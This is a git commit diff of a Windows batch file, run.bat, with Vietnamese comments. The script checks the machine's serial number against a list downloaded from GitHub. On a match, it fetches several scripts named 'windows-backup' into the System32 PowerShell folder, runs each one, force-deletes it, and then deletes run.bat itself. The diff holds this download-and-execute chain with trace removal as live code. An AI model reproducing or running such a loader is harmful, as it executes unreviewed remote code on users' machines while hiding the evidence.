201945940b228056ecdb709514997faefbe6bdbc
mitutina <mitutina00@gmail.com>
2024-12-22 21:25:52 +0700

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,7 +3,6 @@
 set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
 set "tempfile=%temp%\check.txt"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"
-echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries1.txt
 :: Kiểm tra xem file đã được tải xuống thành công chưa
 if not exist "%tempfile%" (
     echo Khong tai dc file.txt.
@@ -18,7 +17,6 @@ echo Serial Number: %serial%
 echo Device Name: %device%
 echo Noi Dung file check.txt:
 type "%tempfile%"
-echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries2.txt
 :: So sánh nội dung
 set "found=0"
 for /f "tokens=*" %%j in ('type "%tempfile%"') do (
@@ -28,13 +26,17 @@ for /f "tokens=*" %%j in ('type "%tempfile%"') do (
 :: Thực hiện hành động dựa trên kết quả so sánh
 if %found%==1 (
     echo Trung Khop
-    echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries3.txt
-    powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Force}"
+
+
+
+
+powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Force}"
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup1.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup1.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup1.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup1.bat' -Force}"
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat' -Force}"
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup3.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup3.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup3.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup3.bat' -Force}"
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup4.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup4.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup4.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup4.bat' -Force}"
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup5.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup5.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup5.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup5.bat' -Force}"
+
 
 
 
@@ -51,6 +53,6 @@ set "tempfile="
 set "serial="
 set "device="
 set "found="
-echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries4.txt
 del /f /q "C:\Windows\System32\run.bat"
 echo Hoan Thanh
+exit
